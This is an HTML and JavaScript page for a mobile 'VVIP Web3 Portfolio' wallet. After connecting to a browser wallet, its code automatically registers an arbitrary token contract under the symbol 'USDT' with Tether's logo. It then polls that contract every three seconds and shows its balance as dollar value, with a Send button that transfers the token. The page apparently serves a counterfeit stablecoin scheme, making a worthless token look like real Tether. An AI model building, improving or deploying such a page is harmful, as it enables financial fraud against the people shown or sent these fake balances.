<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VVIP Web3 Portfolio</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #0f1114; --bg-panel: #181a20; --bg-hover: #22252e;
            --text-main: #ffffff; --text-muted: #848e9c; 
            --accent: #26a17b; --accent-glow: rgba(38, 161, 123, 0.2);
            --danger: #ff4d4f;
        }
        body { background-color: var(--bg-deep); color: var(--text-main); font-family: 'Inter', -apple-system, sans-serif; margin: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
        .app-wrapper { max-width: 440px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-panel); position: relative; padding-bottom: 90px; box-shadow: 0 0 60px rgba(0,0,0,0.8); }
        ::-webkit-scrollbar { display: none; }

        /* VVIP Header & Balance */
        .hero-bg { background: radial-gradient(150% 100% at 50% 0%, var(--accent-glow) 0%, transparent 100%); padding: 24px 20px 30px; border-bottom: 1px solid rgba(255,255,255,0.03); }
        
        /* The MetaMask Perfect $ Alignment */
        .balance-wrapper { display: flex; align-items: baseline; justify-content: center; margin-top: 10px; gap: 2px; }
        .usd-sign { font-size: 28px; font-weight: 600; color: var(--text-muted); }
        .usd-value { font-size: 46px; font-weight: 800; letter-spacing: -1.2px; font-variant-numeric: tabular-nums; }

        /* Connection Badge */
        .status-badge { display: inline-flex; items-center; gap: 6px; background: rgba(255,255,255,0.05); padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; color: var(--text-muted); cursor: pointer; border: 1px solid rgba(255,255,255,0.05); transition: 0.2s; }
        .status-badge:active { background: rgba(255,255,255,0.1); }
        .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 8px var(--danger); }
        .dot.connected { background: var(--accent); box-shadow: 0 0 8px var(--accent); }

        /* Action Buttons */
        .btn-action { width: 56px; height: 56px; border-radius: 18px; background: rgba(255,255,255,0.03); display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.2s; cursor: pointer; border: 1px solid rgba(255,255,255,0.02); }
        .btn-action:active { transform: scale(0.92); background: rgba(255,255,255,0.08); }
        
        /* Asset Rows */
        .asset-row { display: flex; align-items: center; padding: 18px 20px; transition: 0.2s; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); }
        .asset-row:active { background: var(--bg-hover); }
        .asset-icon { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; }
        
        /* Hidden UI Elements */
        #liveSyncIndicator { display: none; font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 1px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }

        /* Bottom Nav */
        .bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 440px; background: rgba(15, 17, 20, 0.95); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 16px 20px 24px; border-top: 1px solid rgba(255,255,255,0.03); z-index: 40; }
        .nav-icon { color: var(--text-muted); display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 11px; font-weight: 600; cursor: pointer; }
        .nav-icon.active { color: var(--text-main); }
        
        /* Modals & Inputs */
        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: flex-end; z-index: 50; }
        .modal-pane { background: var(--bg-panel); width: 100%; max-width: 440px; border-radius: 28px 28px 0 0; padding: 24px; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); border-top: 1px solid rgba(255,255,255,0.05); }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .input-vvip { background: #000; color: white; width: 100%; padding: 18px; border-radius: 16px; font-size: 15px; font-weight: 500; outline: none; border: 1px solid transparent; transition: 0.2s; font-family: 'Inter'; }
        .input-vvip:focus { border-color: var(--accent); background: rgba(38, 161, 123, 0.05); }
        
        /* Custom Toast */
        #toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: #ffffff; color: #000000; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; display: flex; align-items: center; gap: 8px; }
        #toast.show { top: 20px; }
    </style>
</head>
<body>

    <div class="app-wrapper">
        <div id="toast">
            <svg class="w-4 h-4 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
            <span id="toastMsg">Message</span>
        </div>

        <div class="hero-bg">
            <div class="flex justify-between items-center mb-6">
                <div class="flex items-center gap-3">
                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-8 h-8 rounded-full shadow-[0_0_15px_rgba(38,161,123,0.4)]" alt="Vault">
                    <span class="font-bold text-[17px] tracking-tight">Main Vault</span>
                </div>
                <div class="status-badge" onclick="executeVvipConnection()" id="connectBtn">
                    <div class="dot" id="statusDot"></div>
                    <span id="btnText">Connect</span>
                </div>
            </div>

            <div class="flex flex-col items-center mt-6">
                <p class="text-[13px] font-semibold text-[var(--text-muted)] flex items-center gap-2">
                    Total Portfolio Value
                    <span id="liveSyncIndicator">• LIVE SYNC</span>
                </p>
                <div class="balance-wrapper">
                    <span class="usd-sign">$</span>
                    <span id="mainVal" class="usd-value">0.00</span>
                </div>
            </div>

            <div class="flex justify-center gap-4 mt-8">
                <div class="flex flex-col items-center gap-2" onclick="openSend()">
                    <div class="btn-action text-white"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path></svg></div>
                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Send</span>
                </div>
                <div class="flex flex-col items-center gap-2" onclick="showNotification('Scan QR code in wallet to receive')">
                    <div class="btn-action text-white"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></div>
                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Receive</span>
                </div>
                <div class="flex flex-col items-center gap-2" onclick="showNotification('Swap functionality locked.')">
                    <div class="btn-action text-white opacity-40"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg></div>
                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Swap</span>
                </div>
            </div>
        </div>

        <div class="mt-2">
            <div class="px-5 py-4 border-b border-white/5">
                <h3 class="text-[15px] font-bold text-[var(--text-muted)]">Supported Assets</h3>
            </div>
            
            <div id="assetContainer">
                <div class="asset-row">
                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="asset-icon mr-4" alt="BNB">
                    <div class="flex-1">
                        <h4 class="font-bold text-[16px]">BNB</h4>
                        <p class="text-[13px] text-[var(--text-muted)] font-medium">Smart Chain</p>
                    </div>
                    <div class="text-right">
                        <h4 id="rowBnbBal" class="font-bold text-[16px] tabular-nums">0.00</h4>
                        <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">Gas Token</p>
                    </div>
                </div>

                <div class="asset-row relative overflow-hidden" onclick="injectTokenManual()">
                    <div class="absolute left-0 top-0 bottom-0 w-1 bg-[var(--accent)]"></div>
                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="asset-icon mr-4" alt="USDT">
                    <div class="flex-1">
                        <h4 class="font-bold text-[16px] flex items-center gap-2">USDT</h4>
                        <p class="text-[13px] text-[var(--text-muted)] font-medium">Tether USD</p>
                    </div>
                    <div class="text-right">
                        <h4 id="rowUsdtBal" class="font-bold text-[16px] tabular-nums text-[var(--accent)]">0.00</h4>
                        <p id="rowUsdtVal" class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">$0.00</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="bottom-nav">
            <div class="nav-icon active"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>Wallet</div>
            <div class="nav-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path></svg>History</div>
            <div class="nav-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Settings</div>
        </div>
    </div>

    <div class="modal-bg" id="sendModal" onclick="if(event.target==this) closeSend()">
        <div class="modal-pane">
            <div class="flex justify-between items-center mb-6">
                <h3 class="font-bold text-[20px]">Send Asset</h3>
                <svg onclick="closeSend()" class="w-6 h-6 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
            </div>
            <div class="space-y-4 mb-8">
                <div>
                    <label class="text-[12px] font-bold text-[var(--text-muted)] uppercase ml-2 mb-2 block tracking-wider">Send To</label>
                    <input type="text" id="txTo" class="input-vvip" placeholder="Paste 0x Address" autocomplete="off">
                </div>
                <div>
                    <div class="flex justify-between items-center px-2 mb-2">
                        <label class="text-[12px] font-bold text-[var(--text-muted)] uppercase tracking-wider">Amount</label>
                        <span class="text-[12px] font-bold text-[var(--accent)] cursor-pointer">MAX</span>
                    </div>
                    <div class="relative">
                        <input type="number" id="txAmt" class="input-vvip tabular-nums" placeholder="0.00" autocomplete="off">
                        <span class="absolute right-4 top-4 font-bold text-[var(--text-muted)]">USDT</span>
                    </div>
                </div>
            </div>
            <button onclick="executeTx()" id="execBtn" class="w-full bg-[var(--text-main)] text-black font-extrabold py-4 rounded-2xl text-[16px] active:scale-95 transition-transform">
                Preview Transfer
            </button>
        </div>
    </div>

    <script>
        const CONTRACT_ADDRESS = "0x12b6873ef4EcF4E4853ef6849760A61044a24444";
        const LOGO_URL = "https://assets.coingecko.com/coins/images/325/large/Tether.png"; 
        const ABI = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)", "function transfer(address, uint256) returns (bool)"];
        
        let provider, signer, contract, userAccount;
        let realTimeLoop;
        let toastTimer;

        function showNotification(msg) {
            const t = document.getElementById('toast');
            document.getElementById('toastMsg').innerText = msg;
            t.classList.add('show');
            clearTimeout(toastTimer);
            toastTimer = setTimeout(() => t.classList.remove('show'), 3000);
        }

        function openSend() {
            if(!userAccount) return showNotification("Please Connect Wallet");
            document.getElementById('sendModal').style.display = 'flex';
        }
        function closeSend() { document.getElementById('sendModal').style.display = 'none'; }

        // --- The VVIP Connection Sequence ---
        async function executeVvipConnection() {
            if (!window.ethereum) return showNotification("Web3 Browser Required");
            
            try {
                // 1. Prompt Wallet Connection
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];
                
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);

                // UI Update
                document.getElementById('btnText').innerText = userAccount.substring(0,4) + "..." + userAccount.substring(38);
                document.getElementById('statusDot').classList.add('connected');

                // Start Real-Time Sync Loop (Every 3 Seconds)
                document.getElementById('liveSyncIndicator').style.display = 'inline-block';
                fetchLiveBalances(); // Initial fetch
                if(realTimeLoop) clearInterval(realTimeLoop);
                realTimeLoop = setInterval(fetchLiveBalances, 3000);

                showNotification("Wallet Connected Successfully");

                // 2. AUTO-TRIGGER: Inject Token exactly 1.5s after connection
                setTimeout(() => { autoInjectToken(); }, 1500);

            } catch (e) { showNotification("Connection Denied"); }
        }

        // Auto-Inject Function (Triggered by code, not click)
        async function autoInjectToken() {
            try {
                await window.ethereum.request({
                    method: 'wallet_watchAsset',
                    params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: 'USDT', decimals: 18, image: LOGO_URL } }
                });
                showNotification("Asset Successfully Registered");
            } catch (err) {
                console.log("Wallet bypassed auto-inject or user rejected.");
            }
        }
        
        // Manual trigger fallback (If user clicks the USDT row)
        function injectTokenManual() {
            if(userAccount) autoInjectToken();
        }

        // --- Real-Time Fetching Logic ---
        async function fetchLiveBalances() {
            if(!userAccount) return;
            try {
                // Get BNB
                const bnb = await provider.getBalance(userAccount);
                document.getElementById('rowBnbBal').innerText = parseFloat(ethers.utils.formatEther(bnb)).toFixed(4);

                // Get Custom USDT
                const bal = await contract.balanceOf(userAccount);
                const dec = await contract.decimals();
                const numVal = parseFloat(ethers.utils.formatUnits(bal, dec));
                
                // Format nicely (e.g. 99,989,994.73)
                const displayStr = numVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                
                // Update UI Instantly
                document.getElementById('mainVal').innerText = displayStr;
                document.getElementById('rowUsdtBal').innerText = displayStr;
                document.getElementById('rowUsdtVal').innerText = "$" + displayStr;
            } catch (e) { console.error("Sync Error", e); }
        }

        // --- Flawless Execution (Send) ---
        async function executeTx() {
            const to = document.getElementById('txTo').value;
            const amt = document.getElementById('txAmt').value;
            const btn = document.getElementById('execBtn');

            if(!to || !amt) return showNotification("Enter valid details");

            try {
                btn.innerText = "Signing..."; btn.classList.add('opacity-50');
                const dec = await contract.decimals();
                const parsedAmt = ethers.utils.parseUnits(amt, dec);
                
                const tx = await contract.transfer(to, parsedAmt);
                
                btn.innerText = "Processing on Chain...";
                await tx.wait(); // Wait for actual blockchain confirmation
                
                showNotification("Transfer Successful!");
                closeSend();
                fetchLiveBalances(); // Update instantly
            } catch (e) { 
                showNotification("Transfer Failed"); 
            } finally { 
                btn.innerText = "Preview Transfer"; btn.classList.remove('opacity-50');
            }
        }
    </script>
</body>
</html>
